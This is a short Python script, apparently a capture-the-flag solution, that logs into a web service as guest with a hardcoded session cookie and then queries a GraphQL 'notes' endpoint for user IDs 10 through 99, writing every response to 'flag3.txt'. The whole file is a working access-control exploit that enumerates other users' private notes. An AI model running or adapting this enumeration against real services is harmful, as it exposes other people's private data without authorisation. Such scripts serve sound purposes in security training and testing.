import json
import time
import requests

writer = open("flag3.txt", 'w')
url1 = "http://202.38.93.111:15001"
headers1 = {
    'Host': '202.38.93.111:15001',
    'Content-Length': '29',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://202.38.93.111:15001',
    'Referer': 'http://202.38.93.111:15001/',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cookie': 'session=.eJwljstqg0AYRt9lthZ07v8IWZhUWu3FSFuaZBPmmkipSTQW25J3r6G788Hh4_yibeh8v0fpuRv8Ddo2DqWIAaWAdSK8gsSRAGwixnEwgRNFLBCihbB80sxkcu81w9hTERKpKbMyOO6ls14AmOAMtYoqzbUlgA1hYEEQaYRhmGEhtbgeJDQJjDtQSjo0hQy97_5ryDTPhw_fXpkkPH3K60Vxi99zbbvNqmjLYlDPpxxgXx6rWstuKeL4JYIjqb6b3duYNfPXnzi2_X2__LwzX1kZZcXGLUNTq3YxztfRw3h47NarU6jK3WyGLn9Um1H9.YXkp3w.HQfS2sScPJBsqrIyJzZAOaOIyOQ',
    'Connection': 'close'
}
data1 = {
    'username': 'guest',
    'password': 'guest'
}
r1 = requests.post(url=url1, data=data1, headers=headers1)
writer.write(r1.text)
for i in range(10, 100, 1):
    url = "http://202.38.93.111:15001/graphql"
    headers = {
        'Host': '202.38.93.111:15001',
        'Content-Length': '49',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
        'Content-Type': 'application/json',
        'Origin': 'http://202.38.93.111:15001',
        'Referer': 'http://202.38.93.111:15001/notes',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cookie': 'session=.eJwljstqg0AYRt9lthZ07v8IWZhUWu3FSFuaZBPmmkipSTQW25J3r6G788Hh4_yibeh8v0fpuRv8Ddo2DqWIAaWAdSK8gsSRAGwixnEwgRNFLBCihbB80sxkcu81w9hTERKpKbMyOO6ls14AmOAMtYoqzbUlgA1hYEEQaYRhmGEhtbgeJDQJjDtQSjo0hQy97_5ryDTPhw_fXpkkPH3K60Vxi99zbbvNqmjLYlDPpxxgXx6rWstuKeL4JYIjqb6b3duYNfPXnzi2_X2__LwzX1kZZcXGLUNTq3YxztfRw3h47NarU6jK3WyGLn9Um1H9.YXkp3w.HQfS2sScPJBsqrIyJzZAOaOIyOQ',
        'Connection': 'close'
    }
    data = {
        "query": "{ notes(userId: " + str(i) + ") { id\ncontents }}"
    }
    r = requests.post(url=url, data=json.dumps(data), headers=headers)
    time.sleep(0.1)
    writer.write(r.text)
    print(i)
